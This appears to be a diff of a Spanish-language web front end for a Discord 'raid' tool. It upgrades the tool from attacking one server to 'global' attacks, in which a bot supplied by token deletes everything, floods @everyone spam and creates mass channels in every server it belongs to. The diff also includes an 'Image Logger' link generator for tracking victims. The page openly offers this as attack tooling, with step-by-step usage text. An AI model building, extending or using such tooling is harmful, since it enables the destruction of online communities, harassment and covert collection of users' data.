@@ -2,102 +2,117 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Elite Multi-Tool | Dashboard</title>
+    <title>ELITE GLOBAL | PANEL</title>
     <script src="https://tailwindcss.com"></script>
     <style>
-        .tab-content { display: none; }
-        .active { display: block; }
-        .bg-dark { background-color: #0d1117; }
-        .card-dark { background-color: #161b22; border: 1px solid #30363d; }
+        @import url('https://googleapis.com');
+        body { background: #050505; font-family: 'Orbitron', sans-serif; color: #00ff41; }
+        .neon-border { border: 1px solid #ff003c; box-shadow: 0 0 15px #ff003c; }
+        .neon-text { text-shadow: 0 0 10px #ff003c; }
+        .btn-raid { background: linear-gradient(45deg, #ff003c, #7000ff); transition: 0.3s; }
+        .btn-raid:hover { transform: scale(1.02); box-shadow: 0 0 25px #ff003c; }
+        .glitch { animation: glitch 1s linear infinite; }
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px,0) skew(0deg); }
+            4%, 60% { transform: translate(-2px,0) skew(0deg); }
+            62% { transform: translate(0,0) skew(5deg); }
+        }
     </style>
 </head>
-<body class="bg-dark text-gray-300 font-mono overflow-x-hidden">
+<body class="p-4 md:p-10">
 
-    <div class="flex h-screen">
-        <!-- SIDEBAR DE COMANDOS -->
-        <aside class="w-72 card-dark p-6">
-            <h1 class="text-red-500 font-black text-2xl mb-8 tracking-tighter">ELITE v1.0</h1>
-            <nav class="space-y-2">
-                <button onclick="tab('raid')" class="w-full text-left p-3 rounded-lg hover:bg-red-900/20 hover:text-red-400 transition">🚀 Raid Control</button>
-                <button onclick="tab('logger')" class="w-full text-left p-3 rounded-lg hover:bg-indigo-900/20 hover:text-indigo-400 transition">📸 Image Logger</button>
-                <button onclick="tab('web')" class="w-full text-left p-3 rounded-lg hover:bg-green-900/20 hover:text-green-400 transition">🔗 Webhook Sender</button>
-            </nav>
-            <div class="mt-10 p-4 bg-black/50 rounded-xl">
-                <h3 class="text-xs font-bold text-gray-500 mb-2">INFO COMANDOS</h3>
-                <ul class="text-[10px] space-y-2 text-gray-400">
-                    <li><b class="text-red-500">.raid:</b> Borrado total + 50 canales + 750 mensajes.</li>
-                    <li><b class="text-indigo-400">.status:</b> Cambia el bot a Streaming con tu web.</li>
-                </ul>
+    <div class="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-4 gap-6">
+        
+        <!-- SIDEBAR -->
+        <aside class="lg:col-span-1 space-y-6">
+            <div class="neon-border p-6 rounded-lg bg-black/80">
+                <h1 class="text-2xl font-black mb-2 glitch neon-text">ELITE v2</h1>
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest mb-6">Global Raid System</p>
+                
+                <div class="space-y-4">
+                    <div class="p-3 bg-white/5 rounded border-l-4 border-red-600">
+                        <p class="text-xs font-bold">STATUS: <span class="text-red-500">READY</span></p>
+                    </div>
+                    <div class="p-3 bg-white/5 rounded border-l-4 border-indigo-600">
+                        <p class="text-xs font-bold text-indigo-400">GLOBAL AUTO-DETECT</p>
+                        <p class="text-[9px] text-gray-500">Ataca todos los servidores al mismo tiempo.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-4 bg-red-900/10 border border-red-900/30 rounded text-[10px]">
+                <p class="font-bold text-red-500 mb-1 italic underline">MODO DE USO</p>
+                <p>1. Pega el Token del Bot.</p>
+                <p>2. Dale a INICIAR ATAQUE.</p>
+                <p>3. El bot nukeará todo donde esté metido.</p>
             </div>
         </aside>
 
-        <!-- DASHBOARD -->
-        <main class="flex-1 p-12 overflow-y-auto">
-            <!-- TAB RAID -->
-            <section id="raid" class="tab-content active">
-                <h2 class="text-4xl font-black mb-8 text-white">DESTRUCTOR DE SERVIDORES</h2>
-                <div class="card-dark p-8 rounded-3xl shadow-2xl space-y-6">
-                    <div class="space-y-2">
-                        <label class="text-xs font-bold text-gray-500">BOT TOKEN</label>
-                        <input id="rToken" type="password" placeholder="MTAy..." class="w-full bg-black p-4 rounded-xl border border-gray-700 focus:border-red-600 outline-none transition">
+        <!-- MAIN PANEL -->
+        <main class="lg:col-span-3 space-y-6">
+            <div class="neon-border p-10 rounded-2xl bg-black/60 backdrop-blur-xl">
+                <h2 class="text-3xl font-black mb-8 italic tracking-tighter neon-text uppercase">Consola de Destrucción</h2>
+                
+                <div class="grid grid-cols-1 gap-6">
+                    <div>
+                        <label class="block text-[10px] text-gray-500 mb-2 font-bold">BOT TOKEN (EL ALMA DEL SISTEMA)</label>
+                        <input id="rToken" type="password" placeholder="TOKEN AQUÍ..." class="w-full bg-black/50 p-4 rounded border border-gray-800 focus:border-red-600 outline-none text-red-500 transition">
                     </div>
-                    <div class="grid grid-cols-2 gap-4">
-                        <div class="space-y-2">
-                            <label class="text-xs font-bold text-gray-500">GUILD ID</label>
-                            <input id="rGuild" type="text" placeholder="ID del servidor" class="w-full bg-black p-4 rounded-xl border border-gray-700 outline-none">
-                        </div>
-                        <div class="space-y-2">
-                            <label class="text-xs font-bold text-gray-500">CANALES NAME</label>
-                            <input id="rChan" type="text" placeholder="ej: raid-elite" class="w-full bg-black p-4 rounded-xl border border-gray-700 outline-none">
-                        </div>
-                    </div>
-                    <div class="space-y-2">
-                        <label class="text-xs font-bold text-gray-500">MENSAJE DE SPAM (+ LAG)</label>
-                        <textarea id="rMsg" placeholder="@everyone RAIDED..." class="w-full bg-black p-4 rounded-xl border border-gray-700 h-32 outline-none"></textarea>
-                    </div>
-                    <div class="space-y-2">
-                        <label class="text-xs font-bold text-gray-500">TU URL (STREAMING STATUS)</label>
-                        <input id="rUrl" type="text" placeholder="https://tu-web.com" class="w-full bg-black p-4 rounded-xl border border-gray-700 outline-none text-indigo-400">
-                    </div>
-                    <button onclick="startRaid()" id="btnR" class="w-full bg-red-600 hover:bg-red-700 py-5 rounded-2xl font-black text-xl shadow-lg transition-all active:scale-95">EJECUTAR ATAQUE TOTAL</button>
-                </div>
-            </section>
 
-            <!-- TAB LOGGER -->
-            <section id="logger" class="tab-content">
-                <h2 class="text-4xl font-black mb-8 text-indigo-500">IMAGE LOGGER</h2>
-                <div class="card-dark p-8 rounded-3xl">
-                    <input id="lName" type="text" placeholder="Nombre de la imagen (ej: hack)" class="w-full bg-black p-4 rounded-xl border border-gray-700 mb-4 outline-none">
-                    <button onclick="gen()" class="w-full bg-indigo-600 py-4 rounded-xl font-bold">GENERAR LINK</button>
-                    <p id="resL" class="mt-6 p-4 bg-black rounded text-green-500 text-xs break-all hidden font-mono"></p>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-[10px] text-gray-500 mb-2 font-bold">NOMBRE DE CANALES</label>
+                            <input id="rChan" type="text" placeholder="elite-was-here" class="w-full bg-black/50 p-4 rounded border border-gray-800 outline-none focus:border-indigo-500 transition">
+                        </div>
+                        <div>
+                            <label class="block text-[10px] text-gray-500 mb-2 font-bold">URL PROMOCIÓN (STREAMING)</label>
+                            <input id="rUrl" type="text" placeholder="https://mi-web.com" class="w-full bg-black/50 p-4 rounded border border-gray-800 outline-none text-indigo-400">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-[10px] text-gray-500 mb-2 font-bold">CARGA DE SPAM (@everyone + LAG)</label>
+                        <textarea id="rMsg" placeholder="Mensaje que saturará los servidores..." class="w-full bg-black/50 p-4 rounded border border-gray-800 h-32 outline-none focus:border-red-600 transition"></textarea>
+                    </div>
+
+                    <button onclick="globalRaid()" id="mainBtn" class="btn-raid w-full py-6 rounded-lg font-black text-2xl italic tracking-widest text-white shadow-2xl">
+                        INICIAR ATAQUE GLOBAL
+                    </button>
                 </div>
-            </section>
+            </div>
+
+            <!-- LOGGER CARD -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="p-6 bg-indigo-900/10 border border-indigo-900/40 rounded-xl">
+                    <h3 class="text-sm font-bold text-indigo-400 mb-4">📸 IMAGE LOGGER</h3>
+                    <input id="lName" type="text" placeholder="Nombre imagen" class="w-full bg-black p-3 rounded border border-gray-800 text-xs mb-3">
+                    <button onclick="gen()" class="w-full bg-indigo-600 p-2 rounded text-xs font-bold">GENERAR LINK</button>
+                    <p id="resL" class="mt-4 text-[9px] text-green-500 break-all bg-black p-2 rounded hidden"></p>
+                </div>
+            </div>
         </main>
     </div>
 
     <script>
-        function tab(id) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-        }
-
-        async function startRaid() {
-            const b = document.getElementById('btnR');
-            b.innerText = "ENVIANDO PAQUETES...";
+        async function globalRaid() {
+            const btn = document.getElementById('mainBtn');
+            btn.innerHTML = "<span class='glitch text-red-500'>SISTEMA EN CURSO...</span>";
+            
             const res = await fetch('/api/run-raid', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     token: document.getElementById('rToken').value,
-                    guildId: document.getElementById('rGuild').value,
                     msg: document.getElementById('rMsg').value,
                     channelName: document.getElementById('rChan').value,
                     myWebsite: document.getElementById('rUrl').value
                 })
             });
-            const d = await res.json();
-            alert(d.success ? "Raid iniciado" : "Error");
-            b.innerText = "EJECUTAR ATAQUE TOTAL";
+            const data = await res.json();
+            if(data.success) {
+                alert("Raid iniciado en " + data.count + " servidores simultáneamente.");
+            }
+            btn.innerText = "INICIAR ATAQUE GLOBAL";
         }
 
         function gen() {
@@ -106,6 +121,8 @@
             document.getElementById('resL').classList.remove('hidden');
         }
     </script>
+</body>
+</html>
 </body>
 </html>
 
